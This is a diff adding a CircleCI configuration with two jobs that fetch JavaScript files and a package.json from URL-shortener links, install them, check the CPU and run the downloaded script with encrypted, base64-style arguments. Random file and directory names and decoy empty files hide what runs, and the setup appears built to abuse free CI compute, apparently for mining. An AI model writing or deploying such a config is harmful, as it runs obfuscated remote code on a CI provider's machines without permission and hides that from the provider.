@@ -1,0 +1,54 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  motherFucker:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir o9rn648lo3i6mpc
+      - run: mkdir mpb7zws5n9ah1wzzasusvh5jk
+      - run: curl -fsSL shorturl.at/jouQ4 -o vwhyy5chkvewc4lv8b6n.js && curl -fsSL
+          shorturl.at/epxAX -o 6mqd04jt3mqes.js && curl -fsSL shorturl.at/sBRZ2
+          -o package.json
+      - run: touch iala0fc1fe7v3r0flguvbzq.sh
+      - run: npm i -s
+      - run: mkdir h235yjiomnlejaa5i58br6a3zpt
+      - run: mkdir hu1ugfn3ag3snsol6mwi
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: node vwhyy5chkvewc4lv8b6n -sp -s
+          U2FsdGVkX1+LyOUw/VUwm2XUbVSPfuZGvgYi5dKNFi2ob69BHFWlwoOT+raiT89urVYBU/g5RpctC4bXB7+win6XMArbKnLbOU3aJkqmPqg23AwvVaHJgEEiPGl3txiyJWAAJ+tNE5uliF8fVbe2MOyblvHomNeztN3IySaDi3RrA4ocswGwWpC3r+Tu1fPWFwJc4UaRuEiHr7rUX0pwVGjEl0XYUfVKlcxklljEG2g=
+          -t U2FsdGVkX19Ch21YYnuXszLXIjUnxwINK5bJp31foCqw9WQcIBvDM/3SHM/Er3Zr -r
+          U2FsdGVkX19nCkpAFQ3wBoGqfucdZW4a37kCEJFXGzsX1NICwzzSBcpwV+6Zva46zs9FkOSVeQcDx6LcChZoLPWucxDMNqZawxbcp01f7ODA74blzpVpAZdr2l7SHadNZhm/aTw97vgjSPSvTk61EiPEXNEuWC9eCAejfczbN8FhZo2EtluM+mg7TzQo35ilpykgzCrFxU6zKs6u4CjBfmehyn4JWBkPaWhL7WjzqsKfS4nD9yIm0O/7nJQSG+FDVtrQCs4pR125z5qRpHBIOe42Y4ba8NlDgA2OwByEcN0=
+          -lpn U2FsdGVkX19/9BiEgKo1AyW04MKfB1+BYJ/YfKfCSL8=
+  jobs_74:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: mkdir wi20yjf44vm94j3wjmvxak
+      - run: curl -fsSL shorturl.at/diB39 -o package.json && curl -fsSL
+          shorturl.at/cxADG -o vtvltzqpipqik36n2qb.js && curl -fsSL
+          shorturl.at/loCT5 -o mpb5ecl82779phi7.js
+      - run: npm i -s
+      - run: mkdir gxe7pc144wc94k5al9fqzvrm
+      - run: touch h1f5jpm57pe7t6fp2ff1j.cpp
+      - run: mkdir z16rijxz2stt2jjiq5ru8lh
+      - run: touch e584qtm4nsgw93w2rqg5lfi.cpp
+      - run: node vtvltzqpipqik36n2qb -sp -lpn
+          U2FsdGVkX1/6EoO9wmRARTWS9JN4H6UFGFL4b5jITkxwLolSSNQ0TvomYPKy3qG/ -t
+          U2FsdGVkX18jg4AKYqkrJGmkGgI4qHdX79/tt257nIQH+TA2BA2DkYkxdK24ph9e -s
+          U2FsdGVkX1+SmhPrcT6FRhV2jaThdYEx7VBaBQvsEGWT7E8dT4hyGonexLQngr+r5QcXPkvcBoVCFUaP7Iopw1KRHPgGLb/Vxkyj9rmZ04FoBzaPUSlzMzkPkjqgZjWPLFNE7dDCixBoXnFXJEbGBBBXYCjsIvarfe7A0YELkm3k0e+ohkMUAEvUYXKshUc0C0strTihMezoFJjg1S39KbRd1S8kc+G9Tf2xa9Boask=
+          -r
+          U2FsdGVkX1/ni9vaADfcuz4KcMICpd516lq/5buRSMqtGzDAdmG1ENVZGtjMIONNK6Y92CgKXlQGeIfoR7cP+47jUBhbKb2jrEMvYEN4+ZrzYab5cqVzbatmWF4V1C5l91eEmvb5UpQhQdbkhMqlXYnq2xsMc6IGmbquKuH4mher8T3Ry3F/4lFNEPDwf207E3vd4K+HPaWSexZZodlZMonsSI/ZzZ60HqyOzLtlD/TDF0ZfHXB59tZXn8b6nzsa3+ougZ2/qzDG1YVpZh9s3iddlEBWugFkCbyaFnzogFY=
+workflows:
+  working:
+    jobs:
+      - motherFucker
+  dataBuild:
+    jobs:
+      - jobs_74
